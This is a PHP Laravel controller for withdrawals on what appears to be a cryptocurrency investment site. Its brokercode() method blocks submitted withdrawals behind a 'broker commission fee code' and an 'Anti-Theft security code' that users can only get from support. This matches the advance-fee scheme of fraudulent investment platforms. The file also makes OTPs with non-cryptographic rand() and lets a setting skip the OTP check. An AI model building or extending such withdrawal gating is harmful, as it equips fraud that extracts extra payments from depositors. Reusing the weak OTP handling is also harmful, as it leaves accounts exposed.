<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Settings;
use App\Models\User_plans;
use App\Models\Wdmethod;
use App\Models\Withdrawal;
use Illuminate\Support\Facades\Auth;
use App\Mail\NewNotification;
use Illuminate\Support\Facades\Mail;
use App\Mail\WithdrawalStatus;
use App\Traits\Coinpayment;
use App\Traits\TemplateTrait;

class WithdrawalController extends Controller
{
    use Coinpayment, TemplateTrait;
    //
    public function withdrawamount(Request $request)
    {
        $request->session()->put('paymentmethod', $request->method);
        return redirect()->route('withdrawfunds');
    }

    //Return withdrawals route
    public function withdrawfunds()
    {
        
        return view("user.withdraw", [
            'title' => 'Complete Withdrawal Request',
            'success' => 'Your withdrawal request has been successfully submitted! Note: A broker commission fee code is required. Please provide your unique confirmation code to facilitate the successful withdrawal of your funds.',
            'step' => 1,
          
          
        ]);
    }

    public function getotp()
    {
        $code = $this->RandomStringGenerator(5);

        $user = Auth::user();
        User::where('id', $user->id)->update([
            'withdrawotp' => $code,
        ]);

        $message = "You have initiated a withdrawal request, use the OTP: $code to complete your request.";
        $subject = "OTP Request";
        Mail::bcc($user->email)->send(new NewNotification($message, $subject, $user->name));

        return redirect()->back()
            ->with('success', 'Action Sucessful! OTP have been sent to your email');
    }

    public function completewithdrawal(Request $request)
    {

        if (Auth::user()->sendotpemail == "Yes") {
            if ($request->otpcode != Auth::user()->withdrawotp) {
                return redirect()->back()->with('message', 'OTP is incorrect, please recheck the code');
            }
        }

        $settings = Settings::where('id', '1')->first();
        if ($settings->enable_kyc == "yes") {
            if (Auth::user()->account_verify != "Verified") {
                return redirect()->back()->with('message', 'Your account must be verified before you can make withdrawal.');
            }
        }

        $method = Wdmethod::where('name', $request->method)->first();

        if ($method->charges_type == 'percentage') {
            $charges = $request['amount'] * $method->charges_amount / 100;
        } else {
            $charges = $method->charges_amount;
        }

        $to_withdraw = $request['amount'] + $charges;
        //return if amount is lesser than method minimum withdrawal amount

        if (Auth::user()->account_bal < $to_withdraw) {
            return redirect()->back()
                ->with('message', 'Sorry, your account balance is insufficient for this request.');
        }

        if ($request['amount'] < $method->minimum) {
            return redirect()->back()
                ->with("message", "Sorry, The minimum amount you can withdraw is $settings->currency$method->minimum, please try another payment method.");
        }

        //get user last investment package
        User_plans::where('user', Auth::user()->id)
            ->where('active', 'yes')
            ->orderBy('activated_at', 'asc')->first();

        //get user
        $user = User::where('id', Auth::user()->id)->first();

        if ($request->method == 'Bitcoin') {
            User::where('id', $user->id)->update([
                'btc_address' => $request->wallet_address,
               
            ]);
            $coin = "BTC";
            $wallet = $user->btc_address;
        } elseif ($request->method  == 'Ethereum') {
            User::where('id', $user->id)->update([
                'eth_address' => $request->wallet_address,
               
            ]);
            $coin = "ETH";
            $wallet = $user->eth_address;
        } elseif ($request->method  == 'Litecoin') {
            User::where('id', $user->id)->update([
                'ltc_address' => $request->wallet_address,
               
            ]);
            $coin = "LTC";
            $wallet = $user->ltc_address;
        } elseif ($request->method  == 'USDT') {
            User::where('id', $user->id)->update([
                'usdt_address' => $request->wallet_address,
               
            ]);
            $coin = "USDT.TRC20";
            $wallet = $user->usdt_address;
        } elseif ($request->method  == 'Bank Transfer') {
           
            User::where('id', $user->id)->update([
                'bank_name' => $request->bank_name,
                'account_name' => $request->account_name,
                'account_number' => $request->account_number,
               
            ]);
        }

        $amount = $request['amount'];
        $ui = $user->id;

        if ($settings->deduction_option == "userRequest") {
            //debit user
            User::where('id', $user->id)->update([
                'account_bal' => $user->account_bal - $to_withdraw,
                'withdrawotp' => NULL,
            ]);
        }

        if ($settings->withdrawal_option == "auto" and ($request->method == 'Bitcoin' or $request->method  == 'Litecoin' or $request->method  == 'Ethereum' or $request->method == 'USDT')) {
            return $this->cpwithdraw($amount, $coin, $wallet, $ui, $to_withdraw);
        }
        
 $details = "$request->wallet_address $request->bankname $request->account_name  $request->account_number";
        //save withdrawal info
        $dp = new Withdrawal();
        $dp->amount = $amount;
        $dp->to_deduct = $to_withdraw;
        $dp->payment_mode = $request->method;
        $dp->status = 'Pending';
        $dp->paydetails =  $details;
        $dp->user = $user->id;
        $dp->wallet_address = $request->wallet_address;
        $dp->bankname= $request->bankname;
        $dp->account_name = $request->	account_name;
        $dp->account_number	 = $request->account_number	;
        $dp->verification  = "Uncompleted";
        $dp->save();


        User::where('id', Auth::user()->id)->update([
            'withdrawal_id' =>  $dp->id,
            
        ]);




        //  return view("user.withdraw", [
        //     'title' => 'Complete Withdrawal Request',
        //     'message' => 'Your withdrawal request has been successfully submitted!', // Add your message here
        //     'step' =>1,
        //     'amount' =>$amount,
        // ]);
      

        return redirect()->route('withdrawfunds');

    }

    public function brokercode(Request $request)
    {
        $pin = $request->input('pin');
        $step = $request->input('step');
       
        if ($step == 1) {
            if ( Auth::user()->code1 == $pin) {
                User::where('id', Auth::user()->id)->update([
                    'step' => 2,   
                ]);
                   return redirect()->back()->with('success','Action was successfully ');
            }else{
                return redirect()->back()
                  ->with('message', 'Sorry, the  Commission fee code you entered is invalid. Kindly contact support to provide you with a valid code.');
            }
        }elseif($step == 2) {
            if ( Auth::user()->code2 == $pin) {
                User::where('id', Auth::user()->id)->update([
                    'step' => 1,   
                ]);
                $user = User::where('id', Auth::user()->id)->first();

                Withdrawal::where('id',$user->withdrawal_id)->update([
                    'verification' => "Completed",
                ]);
                
            $dp = Withdrawal::where('id',Auth::user()->withdrawal_id)->first();

          $settings = Settings::where('id', '1')->first();
        // send mail to admin
      Mail::to($settings->contact_email)->send(new WithdrawalStatus($dp, $user, 'Withdrawal Request', true));

        //send notification to user
     Mail::to($user->email)->send(new WithdrawalStatus($dp, $user, 'Successful Withdrawal Request'));


                   return redirect()->route('withdrawalsdeposits')->with('success','Your withdrawal request has been successfully submitted! Please wait while we process your request.');
            }else{
                return redirect()->back()
                  ->with('message', 'Sorry, the Anti-Theft security code you entered is invalid. Kindly contact support to provide you with a valid code.');
            }
    }

    }

    // for front end content management
    function RandomStringGenerator($n)
    {
        $generated_string = "";
        $domain = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        $len = strlen($domain);
        for ($i = 0; $i < $n; $i++) {
            $index = rand(0, $len - 1);
            $generated_string = $generated_string . $domain[$index];
        }
        // Return the random generated string 
        return $generated_string;
    }
}

